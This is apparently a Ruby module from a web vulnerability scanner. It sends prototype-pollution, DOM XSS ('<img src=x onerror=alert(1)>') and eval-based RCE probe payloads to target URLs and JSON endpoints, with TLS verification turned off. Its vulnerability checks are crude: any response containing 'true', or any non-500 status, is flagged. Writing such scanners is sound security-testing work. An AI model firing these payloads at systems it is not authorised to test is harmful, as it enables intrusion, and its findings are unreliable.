require 'uri'
require 'net/http'
require 'json'
require_relative '../utils/network'
require_relative '../utils/colorize'

class PrototypePollution
  PAYLOADS = [
    '__proto__[polluted]=true',
    '__proto__.polluted=true',
    'constructor[prototype][polluted]=true',
    'constructor.prototype.polluted=true',
    '__proto__[__proto__][polluted]=true',
    'constructor[constructor][prototype][polluted]=true'
  ]

  def self.test_url_prototype_pollution(url, parameter = 'input')
    results = []
    
    PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response
          test_check_url = url.include?('?') ? "#{url}&#{parameter}=test" : "#{url}?#{parameter}=test"
          check_response = Network.http_request(test_check_url)
          
          if check_response && (check_response.body.include?('polluted') || check_response.body.include?('true'))
            puts Colorize.red("Prototype pollution found!")
            puts Colorize.yellow("Payload: #{payload}")
            results << { payload: payload, vulnerable: true }
          end
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_json_prototype_pollution(url, parameter = 'data')
    json_payloads = [
      { '__proto__' => { 'polluted' => true } },
      { 'constructor' => { 'prototype' => { 'polluted' => true } } },
      { '__proto__' => { '__proto__' => { 'polluted' => true } } }
    ]
    
    results = []
    
    json_payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = 'application/json'
        req.body = { parameter => payload }.to_json
        
        res = http.request(req)
        
        if res.code.to_i == 200
          check_req = Net::HTTP::Post.new(uri.path)
          check_req['Content-Type'] = 'application/json'
          check_req.body = { parameter => { 'test' => 'value' } }.to_json
          check_res = http.request(check_req)
          
          if check_res && (check_res.body.include?('polluted') || check_res.body.include?('true'))
            puts Colorize.red("JSON prototype pollution found!")
            results << { payload: payload, vulnerable: true }
          end
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_dom_xss_via_prototype(url, parameter = 'input')
    xss_payloads = [
      '__proto__[innerHTML]=<img src=x onerror=alert(1)>',
      '__proto__[outerHTML]=<img src=x onerror=alert(1)>',
      'constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>',
      '__proto__[__proto__][innerHTML]=<img src=x onerror=alert(1)>'
    ]
    
    results = []
    
    xss_payloads.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && (response.body.include?('<img') || response.body.include?('onerror'))
          puts Colorize.red("DOM XSS via prototype pollution!")
          puts Colorize.yellow("Payload: #{payload}")
          results << { payload: payload, vulnerable: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_rce_via_prototype(url, parameter = 'input')
    rce_payloads = [
      '__proto__[exec]=eval',
      '__proto__[exec]=Function',
      'constructor[prototype][exec]=eval',
      '__proto__[__proto__][exec]=eval'
    ]
    
    results = []
    
    rce_payloads.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i != 500
          puts Colorize.yellow("Testing RCE via prototype: #{payload}")
          results << { payload: payload, tested: true }
        end
      rescue => e
      end
    end
    
    results
  end
end

